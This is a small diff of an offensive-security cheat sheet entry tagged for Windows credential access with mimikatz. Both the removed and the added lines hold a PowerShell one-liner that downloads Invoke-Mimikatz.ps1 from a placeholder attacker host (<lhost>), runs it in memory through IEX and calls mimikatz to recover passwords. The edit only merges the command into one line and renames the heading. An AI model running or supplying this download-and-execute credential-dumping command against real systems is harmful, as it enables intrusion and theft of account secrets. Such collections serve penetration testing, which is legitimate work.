@@ -3,11 +3,10 @@
 % mimikatz, passwords
 #plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
 
-## powershell - load mimikatz
+## ps1 - load Invoke-Mimikatz
 https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
 ```powershell
-(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX
-Invoke mimikatz
+(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX ; Invoke mimikatz
 ```
 
 ## mimikatz onliner
